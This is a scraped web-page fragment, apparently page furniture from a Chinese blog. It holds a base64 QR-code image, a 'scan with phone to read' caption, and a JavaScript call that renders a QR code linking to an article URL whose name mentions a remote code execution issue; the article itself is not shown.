![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-ModuleUpHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 